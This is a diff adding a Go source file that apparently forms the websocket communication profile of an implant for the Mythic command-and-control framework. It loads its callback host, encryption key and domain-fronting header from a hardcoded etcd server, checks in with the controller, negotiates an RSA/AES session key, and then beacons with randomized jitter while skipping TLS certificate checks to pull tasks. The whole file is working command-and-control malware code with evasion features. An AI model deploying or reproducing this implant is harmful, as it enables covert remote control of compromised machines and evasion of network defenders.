@@ -1,0 +1,415 @@
+package profiles
+
+import (
+	"crypto/rsa"
+	"crypto/tls"
+	"encoding/base64"
+	"encoding/json"
+	"fmt"
+	"github.com/xdefrag/viper-etcd/remote"
+	"io"
+	"io/ioutil"
+	"log"
+	"math/rand"
+	"net/http"
+	"strconv"
+	"strings"
+	"time"
+
+	// 3rd Party
+	"github.com/gorilla/websocket"
+	"github.com/spf13/viper"
+
+	//     chrysalis
+	"github.com/FractalKnight/chrysalis/pkg/utils/crypto"
+	"github.com/FractalKnight/chrysalis/pkg/utils/structs"
+)
+
+var callback_host string
+var callback_port string
+var USER_AGENT string
+var AESPSK string
+var callback_interval string
+var encrypted_exchange_check string
+var domain_front string
+var ENDPOINT_REPLACE string
+var callback_jitter string
+
+func init() {
+	viper.RemoteConfig = &remote.Config{
+		Decoder: &decode{},
+	}
+}
+
+type decode struct{}
+
+func (d decode) Decode(r io.Reader) (interface{}, error) {
+	raw, err := ioutil.ReadAll(r)
+	if err != nil {
+		return nil, err
+	}
+
+	s := string(raw)
+
+	if strings.Contains(s, ",") {
+		return strings.Split(s, ","), nil
+	}
+
+	return s, nil
+}
+
+func must(err error) {
+	if err != nil {
+		panic(err)
+	}
+}
+
+type xWebsockets struct {
+	HostHeader     string
+	BaseURL        string
+	Interval       int
+	Jitter         int
+	ExchangingKeys bool
+	UserAgent      string
+	Key            string
+	RsaPrivateKey  *rsa.PrivateKey
+	Conn           *websocket.Conn
+	Endpoint       string
+}
+
+func New() structs.Profile {
+	vpr := viper.New()
+	must(vpr.AddRemoteProvider("etcd", "http://192.168.1.74:2379", "/config"))
+	vpr.SetConfigType("json")
+	must(vpr.ReadRemoteConfig())
+
+	callback_host = vpr.Get("host").(string)
+	callback_port = vpr.Get("port").(string)
+	USER_AGENT = vpr.Get("ua").(string)
+	AESPSK = vpr.Get("psk").(string)
+	callback_interval = vpr.Get("interval").(string)
+	encrypted_exchange_check = vpr.Get("exchange").(string)
+	domain_front = vpr.Get("front").(string)
+	ENDPOINT_REPLACE = vpr.Get("endpoint").(string)
+	callback_jitter = vpr.Get("jitter").(string)
+
+	var final_url string
+	var last_slash int
+	if callback_port == "443" && strings.Contains(callback_host, "wss://") {
+		final_url = callback_host
+	} else if callback_port == "80" && strings.Contains(callback_host, "ws://") {
+		final_url = callback_host
+	} else {
+		last_slash = strings.Index(callback_host[8:], "/")
+		if last_slash == -1 {
+			//there is no 3rd slash
+			final_url = fmt.Sprintf("%s:%s", callback_host, callback_port)
+		} else {
+			//there is a 3rd slash, so we need to splice in the port
+			last_slash += 8 // adjust this back to include our offset initially
+			//fmt.Printf("index of last slash: %d\n", last_slash)
+			//fmt.Printf("splitting into %s and %s\n", string(callback_host[0:last_slash]), string(callback_host[last_slash:]))
+			final_url = fmt.Sprintf("%s:%s%s", string(callback_host[0:last_slash]), callback_port, string(callback_host[last_slash:]))
+		}
+	}
+	if final_url[len(final_url)-1:] != "/" {
+		final_url = final_url + "/"
+	}
+	profile := xWebsockets{
+		HostHeader: domain_front,
+		BaseURL:    final_url,
+		UserAgent:  USER_AGENT,
+		Key:        AESPSK,
+		Endpoint:   ENDPOINT_REPLACE,
+	}
+
+	// Convert sleep from string to integer
+	i, err := strconv.Atoi(callback_interval)
+	if err == nil {
+		profile.Interval = i
+	} else {
+		profile.Interval = 10
+	}
+
+	// Convert jitter from string to integer
+	j, err := strconv.Atoi(callback_jitter)
+	if err == nil {
+		profile.Jitter = j
+	} else {
+		profile.Jitter = 23
+	}
+
+	if encrypted_exchange_check == "T" {
+		profile.ExchangingKeys = true
+	}
+
+	if len(profile.UserAgent) <= 0 {
+		profile.UserAgent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
+	}
+
+	return &profile
+}
+
+func (c *xWebsockets) Start() {
+	// Checkin with Mythic via an egress channel
+	resp := c.CheckIn()
+	checkIn := resp.(structs.CheckInMessageResponse)
+	// If we successfully checkin, get our new ID and start looping
+	if strings.Contains(checkIn.Status, "success") {
+		SetMythicID(checkIn.ID)
+		for {
+			// loop through all task responses
+			message := CreateMythicMessage()
+			encResponse, _ := json.Marshal(message)
+			//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
+			resp := c.SendMessage(encResponse).([]byte)
+			if len(resp) > 0 {
+				//fmt.Printf("Raw resp: \n %s\n", string(resp))
+				taskResp := structs.MythicMessageResponse{}
+				err := json.Unmarshal(resp, &taskResp)
+				if err != nil {
+					//log.Printf("Error unmarshal response to task response: %s", err.Error())
+					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+					continue
+				}
+				HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
+			}
+			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+		}
+	} else {
+		fmt.Printf("Uh oh, failed to checkin\n")
+	}
+}
+
+func (c *xWebsockets) GetSleepTime() int {
+	if c.Jitter > 0 {
+		jit := float64(rand.Int()%c.Jitter) / float64(100)
+		jitDiff := float64(c.Interval) * jit
+		if int(jit*100)%2 == 0 {
+			return c.Interval + int(jitDiff)
+		} else {
+			return c.Interval - int(jitDiff)
+		}
+	} else {
+		return c.Interval
+	}
+}
+
+func (c *xWebsockets) SetSleepInterval(interval int) string {
+	if interval >= 0 {
+		c.Interval = interval
+		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
+	} else {
+		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
+	}
+
+}
+
+func (c *xWebsockets) SetSleepJitter(jitter int) string {
+	if jitter >= 0 && jitter <= 100 {
+		c.Jitter = jitter
+		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
+	} else {
+		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
+	}
+}
+
+func (c *xWebsockets) ProfileType() string {
+	return "websocket"
+}
+
+func (c *xWebsockets) CheckIn() interface{} {
+	// Establish a connection to the websockets server
+	url := fmt.Sprintf("%s%s", c.BaseURL, c.Endpoint)
+	header := make(http.Header)
+	header.Set("User-Agent", c.UserAgent)
+
+	// Set the host header
+	if len(c.HostHeader) > 0 {
+		header.Set("Host", c.HostHeader)
+	}
+
+	d := websocket.Dialer{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+	}
+	for true {
+		connection, _, err := d.Dial(url, header)
+		if err != nil {
+			log.Printf("Error connecting to server %s ", err.Error())
+			//return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
+			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			continue
+		}
+		c.Conn = connection
+		break
+	}
+
+	//log.Println("Connected to server ")
+	checkin := CreateCheckinMessage()
+	checkinMsg, _ := json.Marshal(checkin)
+
+	if c.ExchangingKeys {
+		for !c.NegotiateKey() {
+
+		}
+	}
+	resp := c.sendData("", checkinMsg).([]byte)
+	response := structs.CheckInMessageResponse{}
+	err := json.Unmarshal(resp, &response)
+	if err != nil {
+		//log.Printf("Error unmarshaling response: %s", err.Error())
+		return structs.CheckInMessageResponse{Status: "failed"}
+	}
+
+	if len(response.ID) > 0 {
+		SetMythicID(response.ID)
+	}
+	//fmt.Printf("Sucessfully negotiated a connection\n")
+	return response
+}
+
+func (c *xWebsockets) SendMessage(output []byte) interface{} {
+	return c.sendData("", output)
+}
+
+func (c *xWebsockets) NegotiateKey() bool {
+	sessionID := GenerateSessionID()
+	pub, priv := crypto.GenerateRSAKeyPair()
+	c.RsaPrivateKey = priv
+	//initMessage := structs.EKEInit{}
+	initMessage := structs.EkeKeyExchangeMessage{}
+	initMessage.Action = "staging_rsa"
+	initMessage.SessionID = sessionID
+	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)
+
+	// Encode and encrypt the json message
+	raw, err := json.Marshal(initMessage)
+
+	if err != nil {
+		log.Printf("Error marshaling data: %s", err.Error())
+		return false
+	}
+	resp := c.sendData("", raw).([]byte)
+
+	//decryptedResponse := crypto.RsaDecryptCipherBytes(resp, c.RsaPrivateKey)
+	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
+
+	err = json.Unmarshal(resp, &sessionKeyResp)
+	if err != nil {
+		log.Printf("Error unmarshaling RsaResponse %s", err.Error())
+		return false
+	}
+
+	//log.Printf("Received EKE response: %+v\n", sessionKeyResp)
+	// Save the new AES session key
+	encryptedSesionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
+	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSesionKey, c.RsaPrivateKey)
+	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
+	c.ExchangingKeys = false
+
+	if len(sessionKeyResp.UUID) > 0 {
+		SetMythicID(sessionKeyResp.UUID)
+	} else {
+		return false
+	}
+	return true
+}
+
+func (c *xWebsockets) reconnect() {
+	header := make(http.Header)
+	header.Set("User-Agent", c.UserAgent)
+	if len(c.HostHeader) > 0 {
+		header.Set("Host", c.HostHeader)
+	}
+	d := websocket.Dialer{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+	}
+	url := fmt.Sprintf("%s%s", c.BaseURL, c.Endpoint)
+	for true {
+		connection, _, err := d.Dial(url, header)
+		if err != nil {
+			//log.Printf("Error connecting to server %s ", err.Error())
+			//return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
+			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			continue
+		}
+		c.Conn = connection
+		break
+	}
+}
+
+func (c *xWebsockets) sendData(tag string, sendData []byte) interface{} {
+	m := structs.Message{}
+	if len(c.Key) != 0 {
+		sendData = c.encryptMessage(sendData)
+	}
+
+	if GetMythicID() != "" {
+		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
+	} else {
+		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
+	}
+	sendData = []byte(base64.StdEncoding.EncodeToString(sendData))
+	for true {
+		m.Client = true
+		m.Data = string(sendData)
+		m.Tag = tag
+		//log.Printf("Sending message %+v\n", m)
+		err := c.Conn.WriteJSON(m)
+		if err != nil {
+			//log.Printf("%v", err);
+			c.reconnect()
+			continue
+		}
+		// Read the response
+		resp := structs.Message{}
+		err = c.Conn.ReadJSON(&resp)
+
+		if err != nil {
+			//log.Println("Error trying to read message ", err.Error())
+			c.reconnect()
+			continue
+		}
+
+		raw, err := base64.StdEncoding.DecodeString(resp.Data)
+		if err != nil {
+			//log.Println("Error decchrysalisg base64 data: ", err.Error())
+			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			continue
+		}
+
+		if len(raw) < 36 {
+			//log.Println("length of data < 36")
+			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			continue
+		}
+
+		enc_raw := raw[36:] // Remove the Payload UUID
+
+		if len(c.Key) != 0 {
+			//log.Printf("Decrypting data")
+			enc_raw = c.decryptMessage(enc_raw)
+			if len(enc_raw) == 0 {
+				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+				continue
+			}
+		}
+
+		return enc_raw
+	}
+
+	return make([]byte, 0)
+}
+
+func (c *xWebsockets) encryptMessage(msg []byte) []byte {
+	key, _ := base64.StdEncoding.DecodeString(c.Key)
+	return crypto.AesEncrypt(key, msg)
+}
+func (c *xWebsockets) decryptMessage(msg []byte) []byte {
+	key, _ := base64.StdEncoding.DecodeString(c.Key)
+	return crypto.AesDecrypt(key, msg)
+}
